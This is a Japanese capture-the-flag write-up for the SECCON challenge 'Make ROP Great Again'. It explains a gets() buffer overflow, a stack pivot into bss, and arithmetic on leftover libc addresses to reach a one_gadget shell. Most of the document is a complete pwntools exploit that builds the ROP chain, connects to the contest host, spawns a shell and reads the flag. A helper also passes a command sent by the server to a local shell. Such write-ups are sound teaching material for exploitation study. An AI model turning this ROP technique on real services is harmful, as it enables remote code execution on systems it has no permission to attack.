# Make ROP Great Again
getsがあるので自明なBOF、ROPを組みたいが単純なgadgetがないのでどうにかする問題。

頑張ってどうにかできたので以下ざっくりとした流れ。
* bssの固定アドレス領域にstack pivot(stackアドレスが既知だと色々やりやすくなるので)
* _startからmain関数を実行すると_IO_file_underflow+357(`pop rbx; ...; ret;`が存在するいい感じのgadget)のアドレスがstackに残る
* `add dword[rbp-0x3d]; ebx; ret;`のgadgetを使い、これまたstack上に落ちている_libc_start_main+139に加算を行うことでstack上にone_gadgetのアドレスを用意する。
* 用意したone_gadgetにretする

```
=> 0x7ffff7e3d795 <_IO_file_underflow+357>:     test   rax,rax
   0x7ffff7e3d798 <_IO_file_underflow+360>:     jle    0x7ffff7e3d7e8 <_IO_file_underflow+440>
   0x7ffff7e3d79a <_IO_file_underflow+362>:     mov    rdx,QWORD PTR [rbx+0x90]
   0x7ffff7e3d7a1 <_IO_file_underflow+369>:     add    QWORD PTR [rbx+0x10],rax
   0x7ffff7e3d7a5 <_IO_file_underflow+373>:     cmp    rdx,0xffffffffffffffff
   0x7ffff7e3d7a9 <_IO_file_underflow+377>:     je     0x7ffff7e3d7b5 <_IO_file_underflow+389>
   0x7ffff7e3d7ab <_IO_file_underflow+379>:     add    rdx,rax
   0x7ffff7e3d7ae <_IO_file_underflow+382>:     mov    QWORD PTR [rbx+0x90],rdx
   0x7ffff7e3d7b5 <_IO_file_underflow+389>:     mov    rax,QWORD PTR [rbx+0x8]
   0x7ffff7e3d7b9 <_IO_file_underflow+393>:     movzx  eax,BYTE PTR [rax]
   0x7ffff7e3d7bc <_IO_file_underflow+396>:     add    rsp,0x8
   0x7ffff7e3d7c0 <_IO_file_underflow+400>:     pop    rbx
   0x7ffff7e3d7c1 <_IO_file_underflow+401>:     pop    r12
   0x7ffff7e3d7c3 <_IO_file_underflow+403>:     pop    r13
   0x7ffff7e3d7c5 <_IO_file_underflow+405>:     pop    r14
   0x7ffff7e3d7c7 <_IO_file_underflow+407>:     pop    r15
   0x7ffff7e3d7c9 <_IO_file_underflow+409>:     pop    rbp
   0x7ffff7e3d7ca <_IO_file_underflow+410>:     ret 
```

使用するone_gadgetは以下
```
$ one_gadget ./libc.so.6
...
0x1111b7 posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  rdx == NULL || (s32)[rdx+0x4] <= 0
```

最終的なexploit
```python
#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "mrga.seccon.games"
PORT = 7428
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
addr_start = elf.symbols["_start"]
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
plt_gets = elf.plt["gets"]
addr_bss = elf.bss()

# used gadget
add_ah_dh_ret = 0x004010b4          # add ah, dh ; nop word [rax+rax+0x00000000] ; hint_nop edx ; ret ;
add_eax_x2ecb = 0x00401157			# add eax, 0x00002ECB ; add dword [rbp-0x3D], ebx ; nop  ; ret  ;
mov_eax_x0_pop_rbp_ret = 0x004011a6 # mov eax, 0x00000000 ; pop rbp ; ret  ; 
mov_eax_edi_gets_ret = 0x4011c2     #

only_ret = 0x0040101a
leave_ret = 0x004011d4
pop_rbp_ret = 0x0040115d
iikanzi = 0x0040115c                # : add dword [rbp-0x3D], ebx ; nop  ; ret  ; 

libc = ELF('./libc.so.6')

def exploit():

	payload = b''
	payload += b'z'*0x10
	payload += p64(addr_bss+0x88) 			# old_rbp
	payload += p64(plt_gets)				# gets(some_addr_libc) #2
	payload += p64(mov_eax_x0_pop_rbp_ret)
	payload += p64(0x404860)				# next rbp
	payload += p64(add_ah_dh_ret)
	payload += p64(add_eax_x2ecb)*0x15f		# 0x402855
	payload += p64(mov_eax_edi_gets_ret) 	# gets(0x402855) #3
	payload += p64(leave_ret)
	conn.sendlineafter(">\n",payload)		# gets #1
	
	conn.sendline(b'\x00'*4+b'\x20'*3)		# gets #2

	fake_stack = b''
	fake_stack += b'xxx' 					# start at 0x402855
	fake_stack += p64(pop_rbp_ret)
	fake_stack += p64(addr_start)
	fake_stack += (p64(pop_rbp_ret)+p64(0x404f00))*(0x40-1)
	fake_stack += p64(addr_start)

	conn.sendline(fake_stack)				# gets #3

	# prepare (_IO_file_underflow+357) on bss
	payload = b''
	payload += b'x'*0x10
	payload += p64(0x404858)
	payload += p64(leave_ret)
	conn.sendlineafter(">\n",payload)

	payload = b''
	payload += b'x'*0x10
	payload += p64(0x404a30+0x10)
	payload += p64(0x4011be) 				# lea rax,[rbp-0x10]; mov rdi, rax; gets(); leave; ret;
	conn.sendlineafter(">\n",payload)

	rop = b''
	rop += p64(0xdeadbeef) #				# start at 0x404a30
	rop += p64(0xe6f2c)  	    # rbx		(libc_start+139)+0xe6f2c = one_gadget
	rop += p64(0xdeadbee2) 		# r12

	rop += p64(pop_rbp_ret) 	#
	rop += p64(0x404a20)
	rop += p64(leave_ret)
	
	rop += p64(0x404be8+0x3d) #rbp
	rop += p64(iikanzi) #ret
	rop += p64(pop_rbp_ret) #rbp
	rop += p64(0x404be8-8) #rbp				# [0x404be8] = one_gadget
	rop += p64(leave_ret) #rbp
	
	conn.sendline(rop)
	conn.sendline('cat flag*')
	#conn.sendline('id')
	conn.interactive()	

def pow():
	conn.recvline()
	cmd = conn.recvline()
	val = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True).communicate()[0].strip()
	conn.sendline(val)
	print("[+] hashcode done")

if __name__ == "__main__":
	pow()
	exploit()
```
